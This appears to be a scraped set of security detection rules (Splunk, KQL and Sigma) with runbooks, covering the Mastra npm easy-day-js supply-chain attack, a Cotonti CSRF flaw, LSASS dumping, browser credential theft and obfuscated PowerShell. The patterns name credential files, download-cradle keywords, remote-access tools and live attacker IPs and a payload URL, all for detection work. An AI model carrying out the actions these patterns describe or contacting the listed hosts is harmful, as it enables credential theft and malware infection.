      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2023-52271", "CVE-2025-61155", "CVE-2025-1055")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2023-52271", "CVE-2025-61155", "CVE-2025-1055")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

Microsoft Teams external-tenant chat from unverified IT-helpdesk impersonator Delivery High
External Teams chat where displayName contains 'helpdesk' or 'IT support' — common 2024+ vishing pattern (Storm-1811, Black Basta, UNC6692). No CIM data model maps to Teams chats; uses raw O365 audit logs.
ATT&CKT1566.004 T1566
Data sourcesCloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where Application == "Microsoft Teams"
| where ActionType == "MessageSent"
| where RawEventData has "ExternalParticipants"
| extend SenderDisplayName = tostring(parse_json(RawEventData).SenderDisplayName)
| where SenderDisplayName matches regex @"(?i)(help.?desk|it.?support|service.?desk|tech.?support|admin)"
| project Timestamp, AccountDisplayName, IPAddress, ActivityType, SenderDisplayName, RawEventData
// External Teams chat — Teams audit lives in OfficeActivity.
OfficeActivity
| where TimeGenerated > ago(7d)
| where OfficeWorkload == "MicrosoftTeams"
| where Operation in~ ("MessageSent","ChatCreated","TeamsImpersonationDetected")
| where isnotempty(UserId)
| where Subject has_any ("IT","helpdesk","support","password","verify")
   or Recipients has_any ("IT","helpdesk")
| project TimeGenerated, UserId, Operation, Subject, Recipients,
          ClientIP, UserAgent
| order by TimeGenerated desc
CLOUD
`o365_management_activity`
  Workload=MicrosoftTeams Operation=MessageSent

| where match(SenderDisplayName, "(?i)(help.?desk|it.?support|service.?desk|tech.?support|admin)")
| stats count, earliest(_time) as firstTime, latest(_time) as lastTime
    by SenderUpn, SenderDisplayName, RecipientUpn, ChatId

Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe")
   or FileName matches regex @"(?i)kaseya.*\.exe"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where NewProcessName endswith "\AnyDesk.exe"
   or NewProcessName endswith "\TeamViewer.exe"
   or NewProcessName endswith "\TeamViewer_Service.exe"
   or NewProcessName endswith "\ScreenConnect.ClientService.exe"
   or NewProcessName endswith "\ConnectWiseControl.ClientService.exe"
   or NewProcessName endswith "\atera_agent.exe"
   or NewProcessName endswith "\SplashtopStreamer.exe"
   or NewProcessName endswith "\RustDesk.exe"
   or NewProcessName endswith "\NinjaOne.exe"
| project TimeGenerated, Computer, Account, NewProcessName,
          CommandLine, ParentProcessName
| order by TimeGenerated desc

title: Remote-Management (RMM) Tool Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0c
status: experimental
description: |
    AnyDesk / TeamViewer / ScreenConnect / Atera / Splashtop /
    RustDesk — RMM tools attackers commonly install for hands-on-
    keyboard access. Filter against the IT estate's known tool.
references:
    - https://attack.mitre.org/techniques/T1219/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1219
    - attack.command-and-control
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\AnyDesk.exe'
            - '\TeamViewer.exe'
            - '\TeamViewer_Service.exe'
            - '\ScreenConnect.ClientService.exe'
            - '\ConnectWiseControl.ClientService.exe'
            - '\atera_agent.exe'
            - '\SplashtopStreamer.exe'
            - '\RustDesk.exe'
            - '\NinjaOne.exe'
    condition: selection
falsepositives:
    - IT-approved RMM in use across the estate. Maintain a known-IT-
      tool exclusion list per environment.
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe","kaseya*.exe")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe","kaseya*.exe")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
PowerShell encoded / obfuscated command Exploitation High
Encoded or obfuscated PowerShell — common across loaders, recon, and post-exploitation.
ATT&CKT1059.001 T1027
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("powershell.exe","pwsh.exe")
| where ProcessCommandLine matches regex @"(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\pwsh.exe"
| where CommandLine matches regex @"(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)"
| project TimeGenerated, Computer, Account, NewProcessName,
          CommandLine, ParentProcessName
| order by TimeGenerated desc

title: Obfuscated / Encoded PowerShell Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d08
status: experimental
description: |
    PowerShell launched with -EncodedCommand, base64 strings, hidden
    window, no-profile, bypass policy, IEX / Invoke-Expression / Net
    .WebClient.DownloadString — combinations indicating evasion.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1027/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1027
    - attack.execution
    - attack.defense-evasion
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_args:
        CommandLine|contains:
            - '-enc '
            - 'EncodedCommand'
            - 'FromBase64String'
            - 'Invoke-Expression'
            - 'IEX('
            - 'DownloadString'
            - 'Net.WebClient'
            - '-w hidden'
            - '-WindowStyle Hidden'
            - '-nop'
            - '-NoProfile'
            - '-ep bypass'
            - '-ExecutionPolicy Bypass'
    condition: selection_image and selection_args
falsepositives:
    - DevOps tooling that legitimately uses encoded command for
      cross-shell escaping
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("powershell.exe","pwsh.exe")
      AND (Processes.process="*-enc *" OR Processes.process="*EncodedCommand*"
        OR Processes.process="*FromBase64String*" OR Processes.process="*-nop*"
        OR Processes.process="*-w hidden*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*IEX(*" OR Processes.process="*DownloadString*"
        OR Processes.process="*Net.WebClient*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("powershell.exe","pwsh.exe")
      AND (Processes.process="*-enc *" OR Processes.process="*EncodedCommand*"
        OR Processes.process="*FromBase64String*" OR Processes.process="*-nop*"
        OR Processes.process="*-w hidden*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*IEX(*" OR Processes.process="*DownloadString*"
        OR Processes.process="*Net.WebClient*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: LSASS Process Access Outside Microsoft-Signed Tooling
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d04
status: experimental
description: |
    Anything opening lsass.exe with read-memory access that isn't a
    Microsoft signed component (Defender, csrss, etc.) is suspect.
    Mimikatz / Pypykatz / nanodump signature.
references:
    - https://attack.mitre.org/techniques/T1003/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1003.001
    - attack.credential-access
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
    filter_known_good:
        SourceImage|endswith:
            - '\MsSense.exe'
            - '\MsMpEng.exe'
            - '\csrss.exe'
            - '\svchost.exe'
            - '\wininit.exe'
            - '\services.exe'
            - '\lsm.exe'
            - '\SearchProtocolHost.exe'
    condition: selection and not filter_known_good
falsepositives:
    - Third-party EDR / forensic tools — extend the filter list
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

DeviceProcessEvents

          FolderPath, ProcessCommandLine,

| order by Timestamp desc

Cotonti CVE-2026-55742 CSRF rights update missing anti-CSRF token (x=) AIExploitation Medium
Hunts forged state-changing requests to the Cotonti admin rights handler (admin.php?m=rights&a=update) that lack the cot_check_xg anti-CSRF token (the x= parameter). Because the 'update' action never calls cot_check_xg(), a request that reaches a=update without a valid x= token is the exploitation signature for CVE-2026-55742 granting elevated group rights. Rationale: Anchored on the article's exact vulnerable endpoint (system/admin/admin.rights.php → admin.php?m=rights with a=update) and the named CSRF validator cot_check_xg, which is bypassed; cross-checked against Cotonti docs confirming admin.php?m=<module> routing and that the anti-CSRF token rides as the x= parameter ($sys['xk']). Absence of x= on a successful a=update is high-fidelity because the legitimate admin UI always emits the token. Cross-checked against: • https://github.com/advisories/GHSA-7g3p-35vc-mgjr • https://www.cotonti.com/docs/en/admin/url_modification • https://www.cotonti.com/docs/ext/extensions/global_vars
ATT&CKT1098 T1068
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorized DAST/pentest tooling (Burp, OWASP ZAP, Nikto) replaying admin.php?m=rights&a=update without the token
  • Bookmarked or hand-edited admin URL that omits the x= token
  • Browser prefetch/extension re-issuing a stripped URL
  • Uptime/monitoring crawlers hitting admin paths
  • Log pipeline that drops or normalises the x query parameter
Suppression filter
| where HttpStatusCode !in ("401","403","404")
Response runbook
1) Triage: pull the src IP, Referer and User-Agent for the flagged a=update request; confirm whether it returned 200/302 (succeeded) and whether the source IP matches a known admin workstation or an external/unknown host. 2) Contain: if external or unrecognised, force-logout the targeted admin session, reset that admin's credentials, and audit cot group rights for unexpected grants (especially additions via cot_auth_add_group) — revert any unauthorised group privilege changes. 3) Hunt: review subsequent activity from the same admin/session for template or config edits and for web-server processes spawning interpreters (see paired RCE UC); patch Cotonti above 1.0.0 / commit f43f1fc3.
ImWebSession
| where TimeGenerated > ago(7d)
| where Url contains "admin.php" and Url contains "m=rights" and Url contains "a=update"
| where not(Url contains "&x=" or Url contains "?x=")   // forged request lacks cot_check_xg token
| where HttpStatusCode !in ("401","403","404")          // keep requests that actually reached the handler
| project TimeGenerated, SrcIpAddr, DvcHostname, Url, HttpMethod, HttpStatusCode, Referer = HttpRequestHeaderReferer, UserAgent = HttpRequestHeaderUserAgent
| order by TimeGenerated desc

Cotonti web-server process spawning shell after CVE-2026-55742 admin takeover AIInstallation Medium
Hunts PHP/web-server processes (php, php-cgi, w3wp, httpd, nginx) spawning a command interpreter or recon utility — the code-execution stage the advisory warns about once an attacker uses the CSRF privilege escalation to reach the admin template/config editor. Distinct pivot from the web-log CSRF detection: this fires on endpoint process telemetry. Rationale: Grounded in the advisory's explicit statement that admin compromise 'can be further leveraged toward remote code execution' via template/config modification; the highest-fidelity host signal of that outcome is the Cotonti PHP/web-server runtime spawning a shell or recon binary, which never happens in normal Cotonti operation. Process names (php, php-cgi, w3wp, httpd, nginx) are the standard hosts for composer:cotonti/cotonti. Cross-checked against: • https://github.com/advisories/GHSA-7g3p-35vc-mgjr
ATT&CKT1505.003 T1059
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • PHP legitimately shelling out for image processing (ImageMagick convert/magick) or PDF/thumbnail generation
  • Web user running sendmail/mail wrappers for outbound notifications
  • Deployment or update tooling (composer, git pull) executing under the web-server account
  • Cron/backup scripts running as the web user that spawn sh/cmd
  • Monitoring or APM agents injecting helper processes into the web runtime
Suppression filter
| where not(FileName in~ ("convert.exe","magick.exe","sendmail.exe","git.exe")) and ProcessCommandLine !has "composer"
Response runbook
1) Triage: examine the child ProcessCommandLine and the web-server parent command line — benign image/mail helpers (convert, sendmail) are obvious; recon (whoami/net) or download (certutil) commands are not. Correlate the host/time against the paired CSRF rights-update detection. 2) Contain: isolate the web host, kill the spawned process tree, and snapshot the Cotonti webroot for newly written/modified .php and template files. 3) Hunt: review web-server file writes for dropped webshells, audit Cotonti group rights and admin sessions for the CSRF privesc that preceded this, rotate web-app and DB credentials, and upgrade Cotonti past 1.0.0 / commit f43f1fc3.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("php.exe","php-cgi.exe","w3wp.exe","httpd.exe","nginx.exe","caddy.exe")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","net.exe","whoami.exe","certutil.exe","bash.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent

| where EventID == 4688
| where ParentProcessName has_any ("php.exe","php-cgi.exe","w3wp.exe","httpd.exe","nginx.exe","caddy.exe")
| where NewProcessName has_any ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","net.exe","whoami.exe","certutil.exe")
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

Mastra npm Supply Chain Attack: 140+ Packages Backdoored via easy-day-js Typosquat

StepSecurity
2026-06-18 8 use cases 3 techniques 5 kill-chain phases detected

On June 17, 2026, an attacker compromised the @mastra npm organization and quietly added easy-day-js as a dependency across 140+ packages in the Mastra AI framework ecosystem. easy-day-js is a typosquat of the popular dayjs date library, and its latest version contained an obfuscated postinstall dropper that downloaded and ran a second-stage payload from attacker-controlled servers, then deleted itself to remove any trace. Packages with a combined weekly download count exceeding 1.1 million were exposed. If you installed any @mastra package today, treat your environment as compromised.

IPs23.254.164.92 23.254.164.123

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] easy-day-js malicious setup.cjs written/deleted under node_modules
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Mastra npm Supply Chain Attack: 140+ Packages Backdoored via easy-day-js Typosqu
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Mastra easy-day-js postinstall dropper: node setup.cjs --no-warnings
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] easy-day-js Mastra dropper C2 callout to 23.254.164.92 / .123 · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
easy-day-js Mastra dropper C2 callout to 23.254.164.92 / .123 AICommand & Control Medium
Hunts outbound connections to the two hardcoded easy-day-js second-stage C2 hosts (23.254.164.92, 23.254.164.123, payload at https://23.254.164.92:8000/update/49890878). Any dev workstation or CI agent reaching these IPs indicates a compromised @mastra/easy-day-js install fetching the Sapphire Sleet Node.js RAT. Rationale: Both IPs (23.254.164.92, 23.254.164.123) and the :8000/update/ payload URL are confirmed by JFrog, Socket and Microsoft as dedicated easy-day-js C2 — destination-IP match on confirmed-malicious infra is the highest-fidelity pivot available. Cross-checked against: • https://research.jfrog.com/post/easy-day-js/ • https://socket.dev/blog/mastra-npm-packages-compromised • https://www.microsoft.com/en-us/security/blog/2026/06/17/postinstall-payload-inside-mastra-npm-supply-chain-compromise/ • https://thehackernews.com/2026/06/144-mastra-npm-packages-compromised-via.html
ATT&CKT1105 T1571
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Malware analyst or detection engineer detonating the sample in a lab segment that routes through corp egress
  • Threat-intel platform / sandbox actively probing the IOC IPs for enrichment
  • Internal vuln scanner sweeping the 23.254.164.0/24 (FranTech/BuyVM) range
  • Honeypot or canary deliberately reaching the C2 to confirm the block
Suppression filter
| where not(DeviceName has_any ("sandbox","malware-lab","detonation"))
Response runbook
1) Triage: identify the initiating process (expect node.exe) and host role — dev workstation vs CI runner. Pull the parent npm command and the package.json/lockfile to confirm an @mastra or easy-day-js dependency was installed in the last 96h. 2) Contain: block 23.254.164.92 and 23.254.164.123 at egress, isolate the host, and rotate ALL credentials reachable from that environment (npm tokens, LLM API keys, cloud provider tokens, DB secrets) — the RAT harvests them. 3) Hunt: pivot to other hosts that resolved/contacted these IPs, search for node executing setup.cjs, and enumerate every machine that ran npm install since 2026-06-17 01:01 UTC.

Mastra easy-day-js postinstall dropper: node setup.cjs --no-warnings AIInstallation High
Hunts execution of the easy-day-js postinstall dropper — 'node setup.cjs --no-warnings' — that decodes and runs the obfuscated second-stage loader. The --no-warnings flag is the attacker's deliberate suppression of Node deprecation/experimental warnings during install. Rationale: 'node setup.cjs --no-warnings' is the verbatim postinstall hook from the article and is corroborated by Socket/JFrog; the setup.cjs basename plus the --no-warnings evasion flag together make this near-unique to the dropper. Cross-checked against: • https://socket.dev/blog/mastra-npm-packages-compromised • https://research.jfrog.com/post/easy-day-js/ • https://www.mend.io/blog/mastra-npm-scope-takeover-easy-day-js/

easy-day-js malicious setup.cjs written/deleted under node_modules AIDelivery High
Hunts the on-disk footprint of the compromised dependency: the 4,572-byte obfuscated setup.cjs dropped into a node_modules\easy-day-js path during install, and its subsequent self-deletion to destroy forensic evidence. Catches the supply-chain artifact even when egress to C2 is already blocked. Rationale: The setup.cjs filename and the easy-day-js package directory are both verbatim article IOCs; the combination of that exact basename within an easy-day-js node_modules path is unique to this campaign and also surfaces the self-delete (FileDeleted) used for anti-forensics. Cross-checked against: • https://research.jfrog.com/post/easy-day-js/ • https://socket.dev/blog/mastra-npm-packages-compromised • https://www.mend.io/blog/mastra-npm-scope-takeover-easy-day-js/
ATT&CKT1195.002 T1070.004
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher unpacking the easy-day-js tarball on a sanctioned analysis host
  • EDR/AV quarantine or remediation tooling relocating the file (shows as a delete/move)
  • Backup or sync agent copying a node_modules tree that still contains the artifact
  • npm cache extraction of the package during offline triage
Suppression filter
| where not(InitiatingProcessFileName in~ ("MsMpEng.exe","MsSense.exe"))
Response runbook
1) Triage: confirm ActionType — a FileCreated/Modified means an active install; a lone FileDeleted with no prior create suggests the dropper already self-removed (pivot to network + process telemetry). Note FileSize ~4572 bytes and the initiating process. 2) Contain: isolate the host, block the C2 IPs, and purge easy-day-js and the affected @mastra versions from the repo, lockfile and npm cache; rotate any secrets exposed to that env. 3) Hunt: enumerate all hosts/CI runners with an easy-day-js folder, correlate to node setup.cjs executions and C2 callouts, and audit package-lock.json across repos for '"easy-day-js": "^1.11.21"'.
DeviceFileEvents
| where Timestamp > ago(14d)
| where FileName =~ "setup.cjs"
| where FolderPath has "easy-day-js"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, FileSize, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where TargetFileName =~ "setup.cjs"
| where TargetFilePath has "easy-day-js"
| project TimeGenerated, DvcHostname, ActorUsername, EventType, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileSHA256
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Miasma/Hades Bun dropper executed via npm/pip lifecycle hook (setup_bun.js / bun_environment.js) · [LLM] Shai-Hulud/Miasma malicious GitHub Actions workflow file written to .github/workflows
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] TruffleHog secret-scanning spawned by npm/pip during install (Shai-Hulud credential harvest) · [LLM] Developer-runtime exfiltration to webhook.site (Shai-Hulud token drop) · [LLM] Mass npm publish from a developer endpoint (worm self-replication)
Miasma/Hades Bun dropper executed via npm/pip lifecycle hook (setup_bun.js / bun_environment.js) AIInstallation High
Hunts the Miasma (npm) and Hades (PyPI) worm execution chain, which drops setup_bun.js to fetch the Bun runtime and then runs the obfuscated bun_environment.js credential-stealer during package install. These two filenames are the campaign's distinctive payload artifacts confirmed across Zscaler/Datadog/StepSecurity reporting. Rationale: setup_bun.js and bun_environment.js are the named dropper/payload files of the Miasma/Hades waves, confirmed by Zscaler and Datadog second sources — not present in any legitimate package, so a literal cmdline match is high-fidelity. Cross-checked against: • https://www.zscaler.com/blogs/security-research/shai-hulud-campaign-evolution-miasma-hades-and-ai-scanner-evasion • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.stepsecurity.io/blog/the-hades-campaign-pypi-packages
ATT&CKT1059.007 T1195.002
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A developer legitimately scaffolding a Bun-based project that ships its own setup_bun.js helper
  • Internal build tooling that happens to reuse the bun_environment.js name
  • Security researcher detonating a captured sample in a lab endpoint enrolled in production telemetry
  • CI agent image-build steps that pre-warm the Bun runtime
Suppression filter
| where not (InitiatingProcessFolderPath has_any ("\\ci\\","\\buildagent\\") and DeviceName has "build")
Response runbook
